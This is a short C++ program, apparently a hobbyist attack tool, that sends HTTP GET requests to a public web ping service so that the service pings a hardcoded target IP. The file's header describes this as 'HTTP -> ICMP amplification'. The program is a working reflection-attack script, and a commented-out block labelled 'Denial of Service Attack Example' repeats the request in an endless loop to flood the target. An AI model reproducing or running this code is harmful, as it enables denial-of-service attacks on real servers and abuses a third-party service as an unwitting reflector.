/*
Author:			King Butcher
Date:			8.26.2016
Description:	Send HTTP GET requests to websites to perform HTTP -> ICMP amplification
*/

#include "HSock.h"
#include <iostream>
#include <string>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib") // Link library. needed for WSADATA

using namespace std;

int main() {
	// variables
	string target = "104.20.23.127"; // one of google's servers
	int port = 80;
	string urlReflector = "http://network-tools.com/default.asp?prog=ping&host=";
	urlReflector += target;
	HUrl urlParts = getDnsAndSubsite(StringToChar(urlReflector));
	HAddr host = create_addr(StringToChar(urlParts.dnsName), port);

	// WSA Initialization
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		cout << "WSAStartup Failed!" << endl;
		return 1;
	}

	// Create HSocket (Custom socket class)
	HSock socket = HSock(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	// Connect to address via socket
	if (socket.hconnect( host )  != 0) {
		return 1;
	}

	// Perform simple HTTP Get request
	string response = simpleGet(socket, StringToChar(urlReflector));
	cout << "Received HTTP Response! Size: "
		<< response.length() << endl;

	/*
	// Denial of Service Attack Example

	while (true)
		simpleGet(socket, StringToChar(urlReflector);

	*/

	raw_input("Program is finished!");

	// WSA Cleanup and Exit
	WSACleanup();
	return 0;
}